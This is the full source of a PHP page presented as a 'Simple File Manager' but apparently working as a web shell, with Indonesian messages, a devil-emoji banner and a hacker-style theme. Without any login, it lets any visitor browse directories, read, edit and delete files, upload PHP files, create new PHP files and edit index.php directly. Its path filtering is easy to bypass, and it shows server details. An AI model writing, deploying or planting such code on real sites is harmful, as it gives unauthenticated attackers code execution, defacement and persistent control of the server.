<?php
// ============================================
// FIXED SIMPLE FILE MANAGER - No Error 500
// ============================================
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Safe mode checking
$current_dir = isset($_GET['dir']) ? $_GET['dir'] : '.';
// Prevent directory traversal
$current_dir = str_replace(['../', '..\\'], '', $current_dir);
if(!is_dir($current_dir)) $current_dir = '.';

$message = '';
$message_type = 'info';

// Handle file edit save with safe mode
if(isset($_POST['save_file'])) {
    $file_path = $_POST['file_path'];
    $file_path = str_replace(['../', '..\\'], '', $file_path);
    $content = $_POST['file_content'];
    
    // Backup dulu sebelum edit
    if(file_exists($file_path)) {
        copy($file_path, $file_path . '.backup');
    }
    
    if(@file_put_contents($file_path, $content)) {
        $message = '✓ File berhasil disimpan! Backup dibuat: ' . basename($file_path) . '.backup';
        $message_type = 'success';
    } else {
        $message = '✗ Gagal menyimpan file! Cek permission.';
        $message_type = 'error';
    }
}

// Handle file delete with safe mode
if(isset($_GET['delete'])) {
    $file = $_GET['delete'];
    $file = str_replace(['../', '..\\'], '', $file);
    if(file_exists($file) && is_file($file)) {
        // Backup sebelum delete
        copy($file, $file . '.deleted.backup');
        if(@unlink($file)) {
            $message = '✓ File berhasil dihapus! Backup: ' . basename($file) . '.deleted.backup';
            $message_type = 'success';
        } else {
            $message = '✗ Gagal menghapus file!';
            $message_type = 'error';
        }
    }
}

// Handle file create
if(isset($_POST['create_file'])) {
    $new_file = $_POST['new_file_name'];
    $new_file = str_replace(['../', '..\\'], '', $new_file);
    if(!file_exists($new_file)) {
        if(@file_put_contents($new_file, "<?php\n// File dibuat oleh Yang Mulia\n?>")) {
            $message = '✓ File berhasil dibuat: ' . basename($new_file);
            $message_type = 'success';
        } else {
            $message = '✗ Gagal membuat file!';
            $message_type = 'error';
        }
    }
}

// Handle folder create
if(isset($_POST['create_folder'])) {
    $new_folder = $_POST['new_folder_name'];
    $new_folder = str_replace(['../', '..\\'], '', $new_folder);
    if(!is_dir($new_folder)) {
        if(@mkdir($new_folder, 0755)) {
            $message = '✓ Folder berhasil dibuat: ' . basename($new_folder);
            $message_type = 'success';
        } else {
            $message = '✗ Gagal membuat folder!';
            $message_type = 'error';
        }
    }
}

// Handle file upload with safe mode
if(isset($_FILES['upload_file']) && $_FILES['upload_file']['error'] == 0) {
    $target = $current_dir . '/' . basename($_FILES['upload_file']['name']);
    $target = str_replace(['../', '..\\'], '', $target);
    
    // Cek type file
    $allowed = ['php', 'html', 'txt', 'css', 'js', 'json', 'xml'];
    $ext = strtolower(pathinfo($target, PATHINFO_EXTENSION));
    
    if(in_array($ext, $allowed)) {
        if(@move_uploaded_file($_FILES['upload_file']['tmp_name'], $target)) {
            $message = '✓ File berhasil diupload: ' . basename($target);
            $message_type = 'success';
        } else {
            $message = '✗ Gagal upload file!';
            $message_type = 'error';
        }
    } else {
        $message = '✗ Tipe file tidak diizinkan!';
        $message_type = 'error';
    }
}

// Fix untuk edit index.php
$edit_file = '';
if(isset($_GET['edit'])) {
    $edit_file = $_GET['edit'];
    $edit_file = str_replace(['../', '..\\'], '', $edit_file);
} elseif(isset($_GET['edit_index'])) {
    $edit_file = 'index.php';
}

// Safe file read
$file_content = '';
if($edit_file && file_exists($edit_file) && is_file($edit_file)) {
    $file_content = @file_get_contents($edit_file);
    if($file_content === false) {
        $message = '⚠️ Tidak bisa membaca file! Cek permission.';
        $message_type = 'warning';
        $file_content = '';
    }
}

// Function format bytes safe
function formatBytes($bytes) {
    if(!is_numeric($bytes)) return '0 B';
    $bytes = intval($bytes);
    $units = ['B', 'KB', 'MB', 'GB'];
    $i = 0;
    while($bytes >= 1024 && $i < count($units)-1) {
        $bytes /= 1024;
        $i++;
    }
    return round($bytes, 2) . ' ' . $units[$i];
}

// Scan directory dengan error handling
$files = [];
try {
    if(is_dir($current_dir)) {
        $temp_files = scandir($current_dir);
        if($temp_files) {
            $files = $temp_files;
        }
    }
} catch (Exception $e) {
    $message = '⚠️ Error membaca direktori: ' . $e->getMessage();
    $message_type = 'warning';
    $files = [];
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>Simple File Manager - Fixed Version</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: #0a0e1a;
            color: #00ff9d;
            font-family: 'Courier New', monospace;
            padding: 20px;
            line-height: 1.6;
        }
        .container {
            max-width: 1400px;
            margin: 0 auto;
            background: #0f1320;
            border: 1px solid #00ff9d;
            padding: 25px;
            border-radius: 8px;
            box-shadow: 0 0 20px rgba(0,255,157,0.1);
        }
        h1 {
            color: #00ff9d;
            text-shadow: 0 0 10px #00ff9d;
            border-bottom: 2px solid #00ff9d;
            padding-bottom: 15px;
            margin-bottom: 25px;
            font-size: 28px;
        }
        .path-box {
            background: #151a28;
            padding: 15px;
            border-radius: 5px;
            margin-bottom: 25px;
            border-left: 5px solid #00ff9d;
            font-size: 16px;
            word-break: break-all;
        }
        .message {
            padding: 15px;
            margin: 15px 0;
            border-radius: 5px;
            font-weight: bold;
        }
        .message.success { background: #003320; border: 1px solid #00ff9d; color: #00ff9d; }
        .message.error { background: #330000; border: 1px solid #ff5555; color: #ff5555; }
        .message.warning { background: #332200; border: 1px solid #ffaa00; color: #ffaa00; }
        .message.info { background: #001133; border: 1px solid #3399ff; color: #3399ff; }
        
        .toolbar {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
            margin-bottom: 30px;
            padding: 15px;
            background: #151a28;
            border-radius: 5px;
        }
        
        .btn {
            background: #1e2433;
            border: 1px solid #00ff9d;
            color: #00ff9d;
            padding: 10px 18px;
            cursor: pointer;
            border-radius: 4px;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            font-weight: bold;
            transition: all 0.3s;
            text-decoration: none;
            display: inline-block;
        }
        .btn:hover {
            background: #00ff9d;
            color: #0a0e1a;
            border-color: #00ff9d;
            box-shadow: 0 0 10px #00ff9d;
        }
        .btn-danger {
            border-color: #ff5555;
            color: #ff5555;
        }
        .btn-danger:hover {
            background: #ff5555;
            color: #0a0e1a;
            border-color: #ff5555;
            box-shadow: 0 0 10px #ff5555;
        }
        
        table {
            width: 100%;
            border-collapse: collapse;
            margin: 20px 0;
            background: #0f1320;
        }
        th, td {
            border: 1px solid #2a3140;
            padding: 12px;
            text-align: left;
        }
        th {
            background: #1e2433;
            color: #00ff9d;
            font-weight: bold;
        }
        tr:hover {
            background: #1a1f2c;
        }
        
        textarea {
            width: 100%;
            height: 500px;
            background: #151a28;
            border: 2px solid #2a3140;
            color: #00ff9d;
            padding: 15px;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            border-radius: 5px;
            line-height: 1.5;
            resize: vertical;
        }
        textarea:focus {
            border-color: #00ff9d;
            outline: none;
            box-shadow: 0 0 15px rgba(0,255,157,0.2);
        }
        
        input[type=text] {
            background: #151a28;
            border: 1px solid #2a3140;
            color: #00ff9d;
            padding: 10px 15px;
            width: 250px;
            border-radius: 4px;
            font-family: 'Courier New', monospace;
        }
        input[type=file] {
            color: #00ff9d;
            font-family: 'Courier New', monospace;
        }
        
        .editor-section {
            margin-top: 40px;
            border-top: 2px solid #2a3140;
            padding-top: 30px;
        }
        
        .file-icon {
            font-size: 18px;
            margin-right: 8px;
        }
        
        .server-info {
            background: #151a28;
            padding: 15px;
            border-radius: 5px;
            margin-top: 30px;
            font-size: 13px;
            color: #8899cc;
            border: 1px solid #2a3140;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>😈 FILE MANAGER - FIXED VERSION</h1>
        
        <?php if($message): ?>
        <div class="message <?php echo $message_type; ?>">
            <?php echo $message; ?>
        </div>
        <?php endif; ?>
        
        <div class="path-box">
            📁 Current Directory: <strong><?php echo htmlspecialchars($current_dir); ?></strong>
            <?php if(is_writable($current_dir)): ?>
                <span style="color: #00ff9d; margin-left: 15px;">[Writable]</span>
            <?php else: ?>
                <span style="color: #ff5555; margin-left: 15px;">[Read Only]</span>
            <?php endif; ?>
        </div>
        
        <!-- Toolbar -->
        <div class="toolbar">
            <form method="POST" style="display: inline-block;">
                <input type="text" name="new_file_name" placeholder="nama_file.php" required>
                <button type="submit" name="create_file" class="btn">📄 + Buat File</button>
            </form>
            
            <form method="POST" style="display: inline-block;">
                <input type="text" name="new_folder_name" placeholder="nama_folder" required>
                <button type="submit" name="create_folder" class="btn">📁 + Buat Folder</button>
            </form>
            
            <form method="POST" enctype="multipart/form-data" style="display: inline-block;">
                <input type="file" name="upload_file">
                <button type="submit" class="btn">📤 Upload File</button>
            </form>
            
            <a href="?edit_index=1" class="btn">✏️ Edit index.php</a>
            <a href="?dir=." class="btn">🏠 Home</a>
            <a href="<?php echo $_SERVER['PHP_SELF']; ?>" class="btn">🔄 Refresh</a>
        </div>
        
        <!-- File List -->
        <h2 style="margin-bottom: 15px;">📋 File Explorer</h2>
        <table>
            <thead>
                <tr>
                    <th>Type</th>
                    <th>Name</th>
                    <th>Size</th>
                    <th>Permission</th>
                    <th>Modified</th>
                    <th>Actions</th>
                </tr>
            </thead>
            <tbody>
                <?php if($current_dir != '.'): ?>
                <tr>
                    <td>📁</td>
                    <td colspan="5">
                        <a href="?dir=<?php echo urlencode(dirname($current_dir)); ?>" style="color: #ffaa00;">
                            ⬆️ .. (Parent Directory)
                        </a>
                    </td>
                </tr>
                <?php endif; ?>
                
                <?php
                if(is_array($files)):
                    foreach($files as $file):
                        if($file == '.' || $file == '..') continue;
                        
                        $full_path = $current_dir . '/' . $file;
                        if(!file_exists($full_path)) continue;
                        
                        $is_dir = is_dir($full_path);
                        $type = $is_dir ? '📁' : '📄';
                        $size = $is_dir ? '--' : formatBytes(@filesize($full_path));
                        $perms = @substr(sprintf('%o', fileperms($full_path)), -4);
                        $modified = $is_dir ? '--' : @date('Y-m-d H:i:s', filemtime($full_path));
                        
                        if($is_dir):
                ?>
                <tr>
                    <td>📁</td>
                    <td>
                        <a href="?dir=<?php echo urlencode($full_path); ?>">
                            <?php echo htmlspecialchars($file); ?>
                        </a>
                    </td>
                    <td>--</td>
                    <td><?php echo $perms; ?></td>
                    <td>--</td>
                    <td>
                        <a href="?dir=<?php echo urlencode($full_path); ?>" class="btn">📂 Open</a>
                    </td>
                </tr>
                <?php else: ?>
                <tr>
                    <td>📄</td>
                    <td><?php echo htmlspecialchars($file); ?></td>
                    <td><?php echo $size; ?></td>
                    <td><?php echo $perms; ?></td>
                    <td><?php echo $modified; ?></td>
                    <td>
                        <a href="?edit=<?php echo urlencode($full_path); ?>&dir=<?php echo urlencode($current_dir); ?>" class="btn">✏️ Edit</a>
                        <a href="?delete=<?php echo urlencode($full_path); ?>&dir=<?php echo urlencode($current_dir); ?>" class="btn btn-danger" onclick="return confirm('Hapus file <?php echo htmlspecialchars($file); ?>? Backup akan dibuat.')">🗑️ Hapus</a>
                    </td>
                </tr>
                <?php 
                        endif;
                    endforeach;
                endif;
                ?>
            </tbody>
        </table>
        
        <!-- Editor -->
        <?php if($edit_file): ?>
        <div class="editor-section">
            <h2 style="margin-bottom: 20px;">✏️ Editing: <?php echo htmlspecialchars($edit_file); ?></h2>
            
            <form method="POST">
                <input type="hidden" name="file_path" value="<?php echo htmlspecialchars($edit_file); ?>">
                <textarea name="file_content" spellcheck="false"><?php echo htmlspecialchars($file_content); ?></textarea>
                <br><br>
                <div style="display: flex; gap: 10px;">
                    <button type="submit" name="save_file" class="btn" style="padding: 12px 30px;">💾 Simpan Perubahan</button>
                    <a href="?dir=<?php echo urlencode($current_dir); ?>" class="btn" style="border-color: #8899cc;">↩️ Kembali</a>
                    <span style="color: #8899cc; margin-left: auto; padding: 10px;">
                        ⚡ Backup otomatis: <?php echo basename($edit_file); ?>.backup
                    </span>
                </div>
            </form>
        </div>
        <?php endif; ?>
        
        <!-- Server Info -->
        <div class="server-info">
            <div style="display: flex; justify-content: space-between;">
                <span>🖥️ PHP Version: <?php echo phpversion(); ?></span>
                <span>📁 Server: <?php echo $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown'; ?></span>
                <span>🔒 Safe Mode: <?php echo ini_get('safe_mode') ? 'On' : 'Off'; ?></span>
                <span>⚙️ Error Reporting: <?php echo error_reporting(); ?></span>
            </div>
        </div>
    </div>
</body>
</html>
